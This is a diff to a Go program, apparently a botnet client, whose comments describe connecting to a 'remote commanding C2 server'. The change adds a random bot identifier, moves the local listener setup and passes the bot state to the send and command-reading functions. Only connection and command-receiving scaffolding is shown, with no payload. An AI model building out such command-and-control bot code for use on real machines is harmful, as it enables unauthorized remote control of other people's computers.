@@ -5,11 +5,8 @@ import (
 	srv "bot/communication/server"
 	msg "bot/message"
 	"fmt"
-	r "math/rand"
 	"net"
-	"os"
 	"sync"
-	"time"
 )
 
 const (
@@ -17,9 +14,8 @@ const (
 )
 
 var (
-	wg  sync.WaitGroup
-	O   msg.Bot
-	src = r.NewSource(time.Now().UnixNano())
+	wg sync.WaitGroup
+	B msg.Bot
 )
 
 // tryConnect tries to connect to the remote commanding C2 server
@@ -30,36 +26,36 @@ func tryConnect()() {
 	} else {
 		return;
 	}
-	cli.WriteData(remoteServer)
+	cli.WriteData(remoteServer, &B)
 }
 
 func main() () {
+	B.GenerateRandomUid()
+	
 	wg.Add(1)
 	go func(){
 		defer wg.Done()
 		tryConnect()
 	}()
 	
+	var listener net.Listener = srv.StartLocalServer()
+	defer listener.Close()
+	
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
 		
-		var listener net.Listener = srv.StartLocalServer()
-		defer listener.Close()
-		
 		conn, err := listener.Accept()
-		if err != nil {
-			fmt.Println("Error accepting: ", err.Error())
-			os.Exit(1)
-		}
-		fmt.Println("Accepted connection from ", conn.RemoteAddr())
-		commands, err := srv.ReadCommands(conn)
-		if err != nil {
-			fmt.Println("Error reading commands: ", err.Error())
-			return;
-		}
-		fmt.Println("Received commands: ", commands)
+		// edode : Commanding server cannot connect
+		if err != nil { return }
+		defer conn.Close()
 		
+		fmt.Println("Accepted connection from ", conn.RemoteAddr())
+		commands, err := srv.ReadCommands(conn, &B)
+		
+		// edode : Commanding server has closed connection
+		if err != nil { return }
+		fmt.Println("Received commands: ", commands)
 	}()
 	
 	wg.Wait();
